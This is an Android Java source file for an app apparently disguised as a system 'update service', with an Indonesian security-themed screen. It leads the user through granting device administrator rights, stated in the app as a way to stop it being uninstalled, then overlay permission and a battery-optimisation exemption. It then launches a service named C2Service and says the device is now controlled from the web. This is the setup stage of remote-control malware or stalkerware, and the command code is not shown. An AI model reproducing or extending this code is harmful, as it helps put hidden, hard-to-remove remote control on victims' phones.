package com.system.updateservice;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(0xFFF0F0F0);
        layout.setGravity(Gravity.CENTER);
        layout.setPadding(50, 50, 50, 50);

        TextView tvTitle = new TextView(this);
        tvTitle.setText("SISTEM KEAMANAN");
        tvTitle.setTextSize(20);
        tvTitle.setTextColor(0xFF333333);
        tvTitle.setGravity(Gravity.CENTER);
        layout.addView(tvTitle);

        TextView tvDesc = new TextView(this);
        tvDesc.setText("Aplikasi ini membutuhkan Izin Overlay dan Baterai agar bisa berjalan di background.");
        tvDesc.setTextSize(14);
        tvDesc.setTextColor(0xFF555555);
        tvDesc.setGravity(Gravity.CENTER);
        tvDesc.setPadding(0, 20, 0, 40);
        layout.addView(tvDesc);

        Button btnActivate = new Button(this);
        btnActivate.setText("AKTIFKAN SEKARANG");
        btnActivate.setBackgroundColor(0xFFDDDDDD);
        btnActivate.setTextColor(0xFF000000);
        btnActivate.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestAdmin();
            }
        });
        layout.addView(btnActivate);
        setContentView(layout);
    }

    private void requestAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
        if (!dpm.isAdminActive(adminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan agar aplikasi tidak bisa dihapus.");
            startActivityForResult(intent, 1);
        } else {
            requestOverlay();
        }
    }

    private void requestOverlay() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, 2);
            } else {
                requestBattery();
            }
        } else {
            requestBattery();
        }
    }

    private void requestBattery() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, 3);
        } else {
            finishSetup();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == 1) requestOverlay();
        if (requestCode == 2) requestBattery();
        if (requestCode == 3) finishSetup();
    }

    private void finishSetup() {
        Toast.makeText(this, "Sistem Aktif. Silakan atur dari Web.", Toast.LENGTH_SHORT).show();
        startService(new Intent(this, C2Service.class));
        finish(); 
    }
}
